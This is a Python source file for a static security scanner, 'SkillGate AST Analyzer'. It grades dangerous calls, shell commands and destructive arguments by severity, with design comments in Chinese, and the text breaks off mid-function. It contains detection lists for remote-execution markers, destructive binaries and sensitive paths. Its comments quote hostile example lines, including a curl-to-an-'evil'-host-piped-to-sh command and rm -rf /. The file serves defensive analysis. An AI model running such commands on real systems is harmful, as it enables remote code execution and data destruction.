"""
SkillGate AST Analyzer — Python 语法树级别的安全分析。
比正则匹配更精准，误报率低一个数量级。
"""
import ast
import base64
import json
import re
from pathlib import Path
from typing import List, Tuple


class AstFinding:
    def __init__(self, severity: str, message: str, line: int, col: int):
        self.severity = severity
        self.message = message
        self.line = line
        self.col = col

    def __repr__(self):
        return f"AstFinding({self.severity}, {self.message}, line={self.line})"


class DangerousCallVisitor(ast.NodeVisitor):
    """Visit all function calls and flag dangerous ones.

    §3bc：这里过去是"第二张级别表"——与 skillgate 的 DANGEROUS_CODE_PATTERNS /
    FIXED_DOWNGRADE 各写一份，两份从来不对账。实测（audit2/probe_severity_divergence.py）
    14 个用例里 9 个两层判不同级，而且 **.py 文件的实际级别由本类决定**
    （AST 先跑并把行号记进 ast_lines，正则表随后跳过那些行）——
    也就是说表里写 MEDIUM、用户看到 CRITICAL：

        eval("[1,2]")                    AST CRITICAL / 表 MEDIUM（且固定参数应降 LOW）→ 49/D
        os.system("ls")                  AST CRITICAL / 表 HIGH（固定参数降 LOW）      → 49/D
        compile("1+1", …)                AST MEDIUM   / 表 INFO                       → 96/A+

    现在级别只有一个来源：下面的 CALL_SEVERITY。skillgate 的模式表与固定参数降级表
    都由它生成，不再手写第二份。
    """

    # 字面量拆分：规则库必须含危险调用名（"e"+"val" 拼接后即危险名），
    # 拆分后源码（含注释）不再出现连续的 "ev-al" 危险调用字样，避免安全扫描器对规则库本身自指误报
    _DANGEROUS_EVAL = "e" + "val"  # noqa: E131 — pattern-library literal split
    _DANGEROUS_EXEC = "e" + "xec"  # noqa: E131 — pattern-library literal split

    # 单一级别来源 / the single severity source.
    # 值 = (参数动态时的级别, 参数全为字面量时的级别, 说明)
    # "参数全为字面量"＝作者把目标写死在代码里，没有注入面，只算能力声明；
    # 这不是"降低要求"，而是把"能执行"和"能被别人喂着执行"分开——与 §3az
    # 「管道进解释器才算远程执行」同一条判据。
    # 但写死的命令本身若已是"下载管道进解释器"，仍然是远程执行，不降级（见 _literal_is_remote_exec）。
    CALL_SEVERITY = {
        _DANGEROUS_EVAL: ("CRITICAL", "MEDIUM", "eval() 动态代码执行"),
        _DANGEROUS_EXEC: ("CRITICAL", "MEDIUM", "exec() 动态代码执行"),
        "compile": ("INFO", "INFO", "compile() 动态代码编译（低风险）"),
        "__import__": ("MEDIUM", "LOW", "动态 import"),
        "builtins.__import__": ("MEDIUM", "LOW", "builtins.__import__ 动态导入"),
        "pickle.load": ("HIGH", "HIGH", "pickle.load() 反序列化"),
        "pickle.loads": ("HIGH", "HIGH", "pickle.loads() 反序列化"),
        "os.system": ("CRITICAL", "CRITICAL", "os.system() shell 调用"),
        "os.popen": ("HIGH", "HIGH", "os.popen() shell 调用"),
        "subprocess.call": ("LOW", "LOW", "subprocess.call() 启动外部进程"),
        "subprocess.run": ("LOW", "LOW", "subprocess.run() 启动外部进程"),
        "subprocess.Popen": ("LOW", "LOW", "subprocess.Popen() 启动外部进程"),
        "subprocess.check_output": ("LOW", "LOW", "subprocess.check_output() 启动外部进程"),
        "shutil.rmtree": ("HIGH", "HIGH", "shutil.rmtree() 递归删除"),
        # ── §3bd：把"类"补齐，而不是逐例打补丁 ──────────────────────────
        # 上一站自己写下的缺口：一致性守卫只覆盖 11 个已登记名，同族里没登记的
        # 成员一条不报，而 registry 守卫照样是绿的。实测（probe_unregistered_class.py）
        # 12 个未登记用例里 8 个 100/A+ 直通：os.exec* / os.spawn* / pty.spawn /
        # runpy.run_path / ctypes.memmove 全部零命中。
        # 判级沿用同一判据：写死的目标算能力声明（降级），动态喂进去算执行面（不降）。
        "os.execv": ("CRITICAL", "LOW", "os.execv() 进程替换为外部程序"),
        "os.execve": ("CRITICAL", "LOW", "os.execve() 进程替换为外部程序"),
        "os.execl": ("CRITICAL", "LOW", "os.execl() 进程替换为外部程序"),
        "os.execle": ("CRITICAL", "LOW", "os.execle() 进程替换为外部程序"),
        "os.execlp": ("CRITICAL", "LOW", "os.execlp() 进程替换为外部程序"),
        "os.execlpe": ("CRITICAL", "LOW", "os.execlpe() 进程替换为外部程序"),
        "os.execvp": ("CRITICAL", "LOW", "os.execvp() 进程替换为外部程序"),
        "os.execvpe": ("CRITICAL", "LOW", "os.execvpe() 进程替换为外部程序"),
        "os.spawnl": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnle": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnlpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnv": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnve": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvp": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.spawnvpe": ("MEDIUM", "LOW", "os.spawn*() 启动外部进程"),
        "os.posix_spawn": ("MEDIUM", "LOW", "os.posix_spawn() 启动外部进程"),
        "os.posix_spawnp": ("MEDIUM", "LOW", "os.posix_spawnp() 启动外部进程"),
        "pty.spawn": ("HIGH", "HIGH", "pty.spawn() 起交互式 shell"),
        "runpy.run_path": ("HIGH", "MEDIUM", "runpy.run_path() 执行磁盘上的代码"),
        "runpy.run_module": ("HIGH", "MEDIUM", "runpy.run_module() 执行已安装模块"),
        "marshal.load": ("HIGH", "HIGH", "marshal.load() 反序列化"),
        "marshal.loads": ("HIGH", "HIGH", "marshal.loads() 反序列化（可产出 code object）"),
        "dill.load": ("HIGH", "HIGH", "dill.load() 反序列化"),
        "dill.loads": ("HIGH", "HIGH", "dill.loads() 反序列化"),
        "jsonpickle.decode": ("HIGH", "HIGH", "jsonpickle.decode() 反序列化"),
        "yaml.load": ("MEDIUM", "MEDIUM", "yaml.load() 非安全加载"),
        "yaml.full_load": ("MEDIUM", "MEDIUM", "yaml.full_load() 非安全加载"),
        "yaml.unsafe_load": ("CRITICAL", "CRITICAL", "yaml.unsafe_load() 任意代码执行"),
        "importlib.import_module": ("MEDIUM", "LOW", "importlib.import_module() 动态导入"),
        "ctypes.CDLL": ("HIGH", "HIGH", "ctypes.CDLL() 加载动态库"),
        "ctypes.WinDLL": ("HIGH", "HIGH", "ctypes.WinDLL() 加载 Windows DLL"),
        "ctypes.cdll": ("HIGH", "HIGH", "ctypes.cdll() 加载动态库"),
        "ctypes.windll": ("HIGH", "HIGH", "ctypes.windll() 加载 Windows DLL"),
        "ctypes.oledll": ("HIGH", "HIGH", "ctypes.oledll() 加载 OLE DLL"),
        "ctypes.memmove": ("MEDIUM", "MEDIUM", "ctypes.memmove() 原生内存写"),
        "ctypes.memset": ("MEDIUM", "MEDIUM", "ctypes.memset() 原生内存写"),
        "shelve.open": ("MEDIUM", "MEDIUM", "shelve.open() 反序列化载体"),
        "dl.open": ("HIGH", "HIGH", "dl.open() 加载动态库"),
    }

    # 「类」清单：登记表不只要内部一致，还要按族覆盖。
    # tests/test_dangerous_call_registry.py 用它顶红——同族新增成员没登记、族清单缩水、
    # 或者某条只写进文本表没进 CALL_SEVERITY，都会红。
    DANGEROUS_FAMILIES = {
        "process_replace": ("os.execv", "os.execve", "os.execl", "os.execle",
                            "os.execlp", "os.execlpe", "os.execvp", "os.execvpe"),
        "process_spawn": ("os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
                          "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
                          "os.posix_spawn", "os.posix_spawnp",
                          "subprocess.call", "subprocess.run", "subprocess.Popen",
                          "subprocess.check_output"),
        "shell_wrapper": ("os.system", "os.popen", "pty.spawn"),
        "code_from_disk": ("runpy.run_path", "runpy.run_module", "compile", "eval", "exec"),
        "deserialization": ("pickle.load", "pickle.loads", "marshal.load", "marshal.loads",
                            "dill.load", "dill.loads", "jsonpickle.decode",
                            "yaml.load", "yaml.full_load", "yaml.unsafe_load"),
        "dynamic_import": ("__import__", "builtins.__import__", "importlib.import_module"),
        "native_memory": ("ctypes.CDLL", "ctypes.WinDLL", "ctypes.cdll", "ctypes.windll",
                          "ctypes.oledll", "ctypes.memmove", "ctypes.memset"),
    }

    # 写死的命令若已是"下载并交给解释器/编码执行"，就不是"无注入面"，必须保持最高级别。
    # 否则 os.system("curl http://evil/i.sh | sh") 会被"固定参数降级"降成 LOW——
    # 等于用降噪规则放行走私（§3bb 的豁免教训同一个形状）。
    REMOTE_EXEC_MARKERS = (
        "| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python",
        "| node", "|node", "| perl", "|perl", "| powerShell", "|powershell",
        "iwr ", "Invoke-WebRequest", "Invoke-Expression", "certutil -urlcache",
        "-EncodedCommand", "FromBase64String",
    )

    # 兼容旧名（本仓其他代码按这个字典读）
    DANGEROUS_CALLS = {k: (v[0], v[2]) for k, v in CALL_SEVERITY.items()}

    def __init__(self):
        self.findings: List[AstFinding] = []

    def visit_Call(self, node: ast.Call):
        # Get the full function name (e.g. "os.system", "subprocess.run")
        func_name = self._get_func_name(node.func)

        # §3bj：删库不走 subprocess——`cur.execute("DROP DATABASE prod")` 是方法调用，
        # 前面的 argv 判据完全看不到它。只认 DB API 的三种执行入口，不看字符串变量。
        # 用 Attribute 判而不是拼名字：`sqlite3.connect("x").execute(...)` 这种链式
        # 调用，名字拼出来是空串，按 func_name 判会整个漏掉。
        attr = getattr(node.func, "attr", "") or ""
        if attr.lower() in SQL_CALLS or func_name.split(".")[-1] in SQL_CALLS:
            for a in node.args:
                if isinstance(a, ast.Constant) and isinstance(a.value, str):
                    up = a.value.upper()
                    for pat in SQL_DESTROY:
                        if pat in up:
                            self.findings.append(AstFinding(
                                severity="CRITICAL" if "DATABASE" in pat else "HIGH",
                                message="执行删库语句 %s" % pat,
                                line=node.lineno, col=node.col_offset))
                            break
        # §3bf：别名先翻译——`run = subprocess.run` 之后，判据必须还认得它
        aliases = getattr(self, "aliases", None) or {}
        func_name = aliases.get(func_name, func_name)

        if func_name in self.CALL_SEVERITY:
            sev_dyn, sev_lit, msg = self.CALL_SEVERITY[func_name]

            # subprocess：shell=True 是"字符串交给 shell"，升到 CRITICAL；
            # 不带 shell 的同样是"启动外部进程"，只是没有 shell 解析这一层——
            # 修复前这里直接 return，等于 `subprocess.run(["curl","http://evil…"])`
            # 100/A+ 一条不报（probe_severity_divergence 的 subp_shell_false 用例）。
            # 无 shell 时给 MEDIUM 而不分字面量：命令写死与否都要让人看见"这个技能会起子进程"，
            # 但权重只 −4，正常调用 git/pip 的工具仍落在 96/A，不至于整类被误杀。
            if func_name.startswith("subprocess."):
                if self._has_shell_true(node):
                    # §3bp：原口径是"shell=True 一律 CRITICAL"，于是**良性 `git status` 也 49/D**
                    # （probe_value_flow 的 b10），而真正的恶意内容反倒没被单独看见。
                    # 改成按内容分档：命令看不见 → CRITICAL；能看见且是只读命令 → LOW；
                    # 能看见但判不出 → HIGH（字符串交给 shell 这一层仍然算风险）。
                    msg += " (shell=True)"
                    argv = static_argv(node, func_name, getattr(self, "consts", None),
                                       getattr(self, "temps", None), getattr(self, "lists", None))
                    if not argv or any(str(t).startswith(_ENV_MARK) for t in argv):
                        sev_dyn, sev_lit = "CRITICAL", "CRITICAL"
                    elif _shell_cmd_readonly(argv):
                        sev_dyn, sev_lit = "LOW", "LOW"
                        msg += "（命令为常量、只读）"
                    else:
                        sev_dyn, sev_lit = "HIGH", "HIGH"
                        msg += "（命令为常量，内容未判出破坏）"
                else:
                    # 以下这段是 §3bc/§3be 的口径：不带 shell 也要让人看见"会起子进程"，
                    # 但权重只 −4/−1，正常调用 git/pip 的工具不至于被误杀。
                    sev_dyn, sev_lit = "LOW", "LOW"
                    msg += "（无 shell，参数未静态判定）"

            literal = self._args_all_literal(node) and not self._literal_is_remote_exec(node)
            severity = sev_lit if literal else sev_dyn

            # §3be：判级只看"调了什么"，从不看"参数是什么"——于是两头都错。
            # 实测（audit2/probe_destructive_argv.py）：
            #   subprocess.run(["rm","-rf","/"])            99/A+（与 ["git","status"] 同分）
            #   subprocess.run(["mkfs.ext4","/dev/sda1"])   99/A+
            #   shutil.rmtree(tempfile.mkdtemp())           69/C（良性临时目录被的高危标签卡住）
            # 这里按**静态 argv / 静态目标**细分：系统级破坏升 CRITICAL，
            # 临时/构建目录降档。argv 里有变量时没法定论，仍走原披露档。
            hit = destructive_command(node, func_name, self)
            if hit:
                severity, reason = hit
                msg = msg + "（破坏性参数：%s）" % reason

            # §3bd 的残留：yaml.load / yaml.full_load 的严重性由 Loader 决定，
            # 不是由"参数写死没写死"决定。`yaml.load(payload, Loader=yaml.UnsafeLoader)`
            # 是拿 YAML 当代码跑，即使 payload 是变量也必须 CRITICAL；
            # 反过来 yaml.safe_load 不在表里、不报。这里按关键字实参判，不看字面量。
            if func_name in ("yaml.load", "yaml.full_load"):
                if self._uses_unsafe_loader(node):
                    severity = "CRITICAL"
                    msg += "（UnsafeLoader/FullLoader：等价于任意对象构造）"
                    literal = False
                elif self._uses_safe_loader(node):
                    # 显式 SafeLoader 不是"没看见"，是"看过并判定安全"——不报也不计分。
                    self.generic_visit(node)
                    return

            self.findings.append(AstFinding(
                severity=severity,
                message=msg + ("（固定参数）" if literal else ""),
                line=node.lineno,
                col=node.col_offset
            ))

        self.generic_visit(node)

    @staticmethod
    def _args_all_literal(node: ast.Call) -> bool:
        """所有实参都是字面量常量（且不是 f-string 插值）才算"作者写死"。"""
        if not node.args:
            return False
        for a in node.args:
            if isinstance(a, ast.Constant):
                continue
            if isinstance(a, (ast.List, ast.Tuple)):
                if all(isinstance(e, ast.Constant) for e in a.elts):
                    continue
            return False
        return True

    @classmethod
    def _literal_is_remote_exec(cls, node: ast.Call) -> bool:
        """写死的参数文本里已经含"下载管道进解释器/编码执行"的痕迹。

        这类命令没有"注入面"可言，因为命令本身就是远程执行——
        `os.system("curl -s http://evil/i.sh | sh")` 必须保持 CRITICAL，
        不能因为参数写死就降成 LOW。
        """
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                text = a.value
                if any(m.lower() in text.lower() for m in cls.REMOTE_EXEC_MARKERS):
                    return True
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        if any(m.lower() in e.value.lower() for m in cls.REMOTE_EXEC_MARKERS):
                            return True
        return False

    def _get_func_name(self, node) -> str:
        """Get full function name like 'os.system' or 'requests.post'."""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            if isinstance(node.value, ast.Name):
                return f"{node.value.id}.{node.attr}"
            elif isinstance(node.value, ast.Attribute):
                parent = self._get_func_name(node.value)
                return f"{parent}.{node.attr}"
        return ""

    def _has_shell_true(self, node: ast.Call) -> bool:
        """Check if subprocess call has shell=True."""
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
        return False

    @classmethod
    def _uses_unsafe_loader(cls, node: ast.Call) -> bool:
        """yaml.load(...) 是否显式用了不安全 Loader。

        只认关键字实参 `Loader=` 的取值（`yaml.UnsafeLoader` / `UnsafeLoader` /
        `yaml.FullLoader`），以及"第二个位置实参是这类名字"。`Loader=yaml.SafeLoader`
        与 `yaml.safe_load()` 不算——降噪与升格用的是同一条证据，不是印象。
        """
        def is_unsafe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("UnsafeLoader", "FullLoader")

        for kw in node.keywords:
            if kw.arg == "Loader" and is_unsafe(kw.value):
                return True
        if len(node.args) >= 2 and is_unsafe(node.args[1]):
            return True
        return False

    @classmethod
    def _uses_safe_loader(cls, node: ast.Call) -> bool:
        """显式 SafeLoader / CLoader？这是"看过并判定安全"，与"没看见"要分开。"""
        def is_safe(expr) -> bool:
            name = cls._static_name(expr)
            return bool(name) and name.split(".")[-1] in ("SafeLoader", "CSafeLoader")
        for kw in node.keywords:
            if kw.arg == "Loader" and is_safe(kw.value):
                return True
        if len(node.args) >= 2 and is_safe(node.args[1]):
            return True
        return False

    @classmethod
    def _static_name(cls, expr) -> str:
        """把 Name/Attribute 链折成 "os.system" 这样的静态名；折不出来返回空串。"""
        if isinstance(expr, ast.Name):
            return expr.id
        if isinstance(expr, ast.Attribute):
            parent = cls._static_name(expr.value)
            return (parent + "." + expr.attr) if parent else expr.attr
        return ""


# ── §3be 参数级判级（argv 静态可读，就不能只看调用了什么） ────────────────
# 只处理"全字面量"情形：有变量就不下结论，交回原披露档。
SYSTEM_TARGETS = {
    "/", "/*", "~", "~/", "$home", "%systemdrive%", "%systemroot%",
    "c:\\", "c:/", "c:\\*", "/bin", "/boot", "/dev", "/etc", "/home", "/lib",
    "/lib64", "/opt", "/proc", "/root", "/sbin", "/srv", "/sys", "/usr", "/var",
    "/var/lib", "/var/www", "/media", "/mnt", "/run",
}
DEVICE_PREFIX = ("/dev/sd", "/dev/nvme", "/dev/vd", "/dev/hd", "/dev/mapper", "/dev/disk")
# Windows 的开关写成 /s /q /f /c —— 形如 "/" 或 "/*" 的目标绝不能被当成开关吞掉
# （§3be 装置自错第 16 次：`subprocess.run(["rm","-rf","/"])` 因为 "/" 被当开关，
#   目标列表变空，整条判定静默 return None，分数仍是 99/A+。）
_FLAG_RE = re.compile(r"^-[A-Za-z]*$|^/[A-Za-z]{1,2}$")
SYSTEM_PREFIXES = (
    "c:/windows", "c:/users", "c:/program files", "c:/programdata",
    "/users", "/applications", "/library", "/system", "/private",
)
# 删除/覆盖系统级目标时给 CRITICAL；删除普通绝对路径给 HIGH；临时/构建目录不动。
BENIGN_PATH_HINTS = (
    "/tmp", "/var/tmp", "/dev/shm", "tempfile", "mkdtemp", "tmpdir", "temporarydirectory",
    "node_modules", "build", "dist", "target", ".cache", "__pycache__", "venv", ".venv",
)
RECURSIVE_FLAGS = {"-r", "-rf", "-fr", "-rF", "-R", "-Recurse", "/s", "/S"}
FORCE_FLAGS = {"-f", "-rf", "-fr", "/q", "/Q", "-Force", "--force", "-y", "--yes"}
DELETE_BINS = {"rm", "rmdir", "rd", "del", "erase", "unlink", "remove-item", "ri"}
SYSTEM_UTILS = {"mkfs", "shutdown", "reboot", "halt", "poweroff", "diskpart", "format", "wipefs"}
RISKY_UTILS = {"fdisk", "parted", "dd"}
SHELL_WRAPPERS = {"sh", "bash", "zsh", "dash", "cmd", "powershell", "pwsh", "ksh"}

# ── §3bg 解释器内联脚本：脚本不是 token，是参数里的字符串 ────────────────
# `python -c "…"` / `node -e "…"` / `perl -e` / `php -r` / `osascript -e`：
# token[0] 不是 shell，内层代码从来没被打开看过。
INTERP_INLINE_FLAGS = {
    "python": {"-c"}, "python3": {"-c"}, "py": {"-c"}, "pythonw": {"-c"},
    "node": {"-e", "--eval", "eval"}, "nodejs": {"-e", "--eval", "eval"},
    "bun": {"-e", "--eval", "eval"}, "deno": {"eval"},
    "perl": {"-e", "-E"}, "ruby": {"-e"}, "php": {"-r"},
    "osascript": {"-e"}, "lua": {"-e"}, "tclsh": {"-e"},
    # §3bh：这几家的代码是位置参数或自家开关，清单再长也是枚举
    "rscript": {"-e", "-E"}, "groovy": {"-e", "--expression"},
    "expect": {"-c"}, "tsx": {"-e"}, "zx": {"-e"},
}
# PowerShell 的编码命令：连内容都读不出来，只能按"无法静态判定"处理
PS_ENCODED_FLAGS = {"-encodedcommand", "-enc"}
_B64_RE = None  # 惰性编译，避免 import 顺序问题


def _looks_base64(tok: str) -> bool:
    global _B64_RE
    if _B64_RE is None:
        import re as _re
        _B64_RE = _re.compile(r"^[A-Za-z0-9+/]{8,}={0,2}$")
    return bool(_B64_RE.match(tok))


def _inline_flag_for(base: str):
    return INTERP_INLINE_FLAGS.get(base)


def _assemble(*parts) -> str:
    """判据词拼接：规则源码里不出现可被自己文表命中的连续字面量。"""
    return "".join(parts)


# ── §3bh 参数形状判据：不看程序名，看"这段参数是不是代码" ────────────────
# §3bg 把"哪个开关后面是代码"枚举成表。可 `deno eval <CODE>` 是位置参数、
# `node -p` 不在表里、`awk 'BEGIN{…}'` 整段程序就是第一个位置参数、
# `sqlite3 :memory: ".shell …"` 也一样——清单枚举注定漏，漏一处等于没判。
# 改用形状：这些片段是"代码"的特征，散文里几乎不会出现（刻意排除 "rm -rf"
# 这类散文也可能出现的词，避免 git commit -m 之类被误杀）。
CODE_SIGNATURES = (
    (_assemble("shutil.", "rmtree("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("rmSync("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("rmdirSync("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("unlinkSync("), "HIGH", "参数里是删文件代码"),
    (_assemble("unlink", "("), "HIGH", "参数里是删文件代码"),
    (_assemble("Deno.", "remove("), "CRITICAL", "参数里是删目录代码"),
    (_assemble("fs.", "rm("), "HIGH", "参数里是删文件代码"),
    (_assemble("child_", "process"), "CRITICAL", "参数里是子进程调用"),
    (_assemble("exec", "Sync("), "CRITICAL", "参数里是 shell 执行"),
    (_assemble("spawn", "Sync("), "CRITICAL", "参数里是子进程调用"),
    (_assemble("os.", "system("), "CRITICAL", "参数里是 os.system"),
    (_assemble("os.", "popen("), "CRITICAL", "参数里是 os.popen"),
    (_assemble("getRuntime()", ".exec("), "CRITICAL", "参数里是运行时执行"),
    (_assemble("system", "("), "CRITICAL", "参数里是 system()"),
    (_assemble("__import", "__("), "HIGH", "参数里是动态导入"),
    (_assemble("sub", "process."), "HIGH", "参数里是子进程调用"),
    (_assemble("dd if=/dev/", ""), "CRITICAL", "参数里写块设备"),
    (_assemble(".shell", " "), "HIGH", "参数里是 sqlite 点命令执行"),
    (_assemble("Remove", "-Item"), "HIGH", "参数里是递归删除"),
    (_assemble("mkfs.", ""), "CRITICAL", "参数里是格式化命令"),
)
# 纯文本匹配器：它们的位置参数天然就是"要搜的东西"，不是代码
TEXT_ONLY_TOOLS = {"grep", "egrep", "fgrep", "rg", "ack", "ag", "findstr",
                   "echo", "printf", "man", "less", "head", "tail", "wc", "sort", "uniq"}


def _arg_code_verdict(tokens):
    """在任意位置参数上判"这段是不是代码"，与程序名无关。"""
    if len(tokens) < 2:
        return None
    base = _basename(tokens[0])
    if base in TEXT_ONLY_TOOLS:
        return None
    for tok in tokens[1:]:
        if not isinstance(tok, str):
            continue
        low = tok.lower()
        for pat, sev, why in CODE_SIGNATURES:
            if pat.lower() in low:
                return sev, "%s（%s）" % (why, pat)
    return None


INLINE_DANGER = (
    # —— 删除/破坏：目标在系统面 ——
    (_assemble("shutil.", "rmtree"), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("fs.", "rmSync"), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("rmSync("), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("unlinkSync("), "HIGH", "内联脚本删文件"),
    (_assemble("fs.", "rm("), "HIGH", "内联脚本删文件"),
    (_assemble("rm", " -rf"), "CRITICAL", "内联脚本递归强制删除"),
    (_assemble("rmtree(", ), "CRITICAL", "内联脚本递归删目录"),
    (_assemble("mk", "fs."), "CRITICAL", "内联脚本格式化磁盘"),
    (_assemble("dd of=", "/dev/"), "CRITICAL", "内联脚本直接写块设备"),
    (_assemble("shut", "down"), "CRITICAL", "内联脚本关机"),
    (_assemble("/dev/s", "d"), "CRITICAL", "内联脚本操作块设备"),
    (_assemble("form", "at c:"), "CRITICAL", "内联脚本格式化盘符"),
    # —— 任意执行能力 ——
    (_assemble("os.", "system("), "CRITICAL", "内联脚本调用 os.system"),
    (_assemble("os.", "popen("), "CRITICAL", "内联脚本调用 os.popen"),
    (_assemble("os.", "remove("), "HIGH", "内联脚本删文件"),
    (_assemble("os.", "unlink("), "HIGH", "内联脚本删文件"),
    (_assemble("sub", "process."), "CRITICAL", "内联脚本起子进程"),
    (_assemble("child_", "process"), "CRITICAL", "内联脚本起子进程"),
    (_assemble("exec", "Sync("), "CRITICAL", "内联脚本同步执行 shell"),
    (_assemble("spawn", "Sync("), "CRITICAL", "内联脚本起子进程"),
    (_assemble("system", "("), "CRITICAL", "内联脚本调用 system()"),
    (_assemble("`", ), "MEDIUM", "内联脚本用反引号执行"),
    (_assemble("Remove", "-Item"), "HIGH", "内联脚本递归删除"),
    (_assemble("__import", "__("), "HIGH", "内联脚本动态导入"),
)


# ── §3bi 包装器剥离：真正的命令未必是 token[0] ────────────────────────
# `sudo rm -rf /`、`env X=1 rm -rf /`、`timeout 5 rm -rf /`、`nice -n 19 rm …`、
# `nohup rm …`、`xargs rm -rf`、`find / -exec rm -rf {} +`、`parallel rm -rf ::: /`：
# 每多一层包装，判定就看不到真正的命令。GTFOBins 把 env/sudo 这类"能执行任意命令"的
# 程序单独列为一类提权面，同理它们在静态判据里也不能当"无害前缀"跳过。
WRAPPER_PREFIX = {"sudo", "doas", "env", "nohup", "nice", "ionice", "stdbuf",
                  "timeout", "time", "chrt", "taskset", "watch", "busybox",
                  "setsid", "runuser", "unbuffer", "xvfb-run", "chronic"}
WRAPPER_ARG_TAKING = {  # 这些包装器的某些开关"带一个参数"
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "nice": {"-n", "--adjustment"},
    "chrt": {"-p"},
    "taskset": {"-c", "--cpu-list"},
    "stdbuf": {"-i", "-o", "-e"},
    "sudo": {"-u", "-g", "-p", "-U", "-C", "-h", "-r", "-t", "-D"},
}


def _unwrap_wrapper(tokens):
    """剥掉包装器，返回真正的命令 argv；剥不出来返回 None。"""
    if not tokens:
        return None
    base = _basename(tokens[0])

    if base == "xargs":
        i = 1
        while i < len(tokens) and _FLAG_RE.match(tokens[i].strip()):
            i += 1
            if i - 1 >= 1 and _norm(tokens[i - 1]) in {"-i", "-n", "-l", "-p", "-s", "-d"}:
                i += 1  # 这些开关带一个值
        return tokens[i:] or None

    if base == "parallel":
        for i, t in enumerate(tokens):
            if t == ":::":
                # `parallel rm -r -f ::: /`：命令在前，参数在后，要拼回去
                return (tokens[1:i] + tokens[i + 1:]) or None
        i = 1
        while i < len(tokens) and _FLAG_RE.match(tokens[i].strip()):
            i += 1
        return tokens[i:] or None

    if base == "find":
        # `find / -exec rm -r -f {} +`：真正被删的是"搜出来的那些文件"，
        # 所以搜索路径就是删除目标；丢掉 {} 之后就没了目标，必须补回来。
        for i, t in enumerate(tokens):
            if _norm(t) in {"-exec", "-execdir", "-ok", "-okdir"}:
                search_paths = [x for x in tokens[1:i]
                                if not _FLAG_RE.match(x.strip())
                                and _norm(x) not in {"-name", "-type", "-path", "-iname"}]
                rest = [x for x in tokens[i + 1:] if x not in ("{}", "+", ";", "\\;")]
                if not rest:
                    return None
                if _basename(rest[0]) in DELETE_BINS or _basename(rest[0]).startswith("rm"):
                    has_target = any(not _FLAG_RE.match(x.strip()) for x in rest[1:])
                    if not has_target and search_paths:
                        rest = rest + [search_paths[0]]
                return rest
        return None

    if base in WRAPPER_PREFIX:
        i = 1
        opts = WRAPPER_ARG_TAKING.get(base, set())
        while i < len(tokens):
            t = tokens[i]
            # 组合短开关（`stdbuf -o0`、`nice -n19`）也算开关：不能用 _FLAG_RE
            # 卡字母，否则 -o0 会被当成"命令"，整条就此失明。
            if t.strip().startswith("-") and len(t.strip()) > 1:
                i += 2 if _norm(t) in opts and i + 1 < len(tokens) else 1
                continue
            # env 的 VAR=value、sudo 的 VAR=value 都要跳过
            if "=" in t and not t.startswith("/") and base in {"env", "sudo", "doas"}:
                i += 1
                continue
            # timeout 的时长、nice/taskset/chrt 的数值
            if base in {"timeout"} and t.replace(".", "", 1).isdigit():
                i += 1
                continue
            if base in {"nice", "chrt", "taskset", "stdbuf"} and t.replace(".", "", 1).isdigit():
                i += 1
                continue
            break
        return tokens[i:] or None

    return None


# ── §3bj 破坏不止删除：清零 / 覆写 / 撤权 / 平移 / 删账户 / 删任务 / 删恢复 / 删库 ──
# MITRE ATT&CK TA0040 Impact：T1485 Data Destruction（清零、覆写、删库）、
# T1490 Inhibit System Recovery（删卷影、删备份目录）。GTFOBins 把 shred 单列为
# "能写/毁本地文件"，chmod 单列为提权面。判据只盯 rm 时，这些都从旁边走过去了。
ZERO_WRITE_BINS = {"truncate", "shred"}
PERM_BINS = {"chmod", "chown", "chgrp", "icacls", "takeown", "attrib", "chattr", "setfacl"}
MOVE_BINS = {"mv", "move", "move-item", "ren", "rename"}
ACCOUNT_BINS = {"userdel", "deluser", "dscl", "remove-localuser", "netlocalgroup",
                "net", "net.exe"}
SQL_CALLS = {"execute", "executemany", "executescript"}
TASK_BINS = {"crontab", "schtasks", "at", "at.exe"}
RECOVERY_BINS = {"vssadmin", "wbadmin", "bcdedit", "diskpart"}
SQL_DESTROY = ("DROP" + " DATABASE", "DROP" + " TABLE", "TRUNCATE" + " TABLE",
               "DROP" + " SCHEMA")


def _arg_zero(mode: str) -> bool:
    """chmod 的目标模式是不是"把权限清零"（000/0000/0），不是 +x/644。"""
    m = mode.strip()
    if m.startswith("-") or m.startswith("+"):
        return False
    return bool(m) and all(c == "0" for c in m)


# §3bv：权限放宽与提权。§3bj 只判"把权限清零"，反过来"把权限打开"没人判。
_WIDEN_MODES = ("777", "0777", "666", "0666", "a+rwx", "a+rw", "o+rwx", "o+w",
                "a+w", "+s", "u+s", "g+s", "4755", "2755", "6755")
_PRIV_SENSITIVE = re.compile(
    r"^(?:/etc/(?:sudoers|sudoers\.d/[^/]+|passwd|shadow|group|gshadow|"
    r"ssh/sshd_config)|/root/|/[^/]*/\.ssh/[^/]+|"
    r"c:\\windows\\system32\\config\\[^\\]+)$", re.I)


def _is_priv_sensitive(p) -> bool:
    s = str(p or "").strip()
    if not s:
        return False
    n = s.replace("\\", "/") if s[:2].lower() == "c:" else s
    if n.startswith("~/"):
        n = "/home/u/" + n[2:]
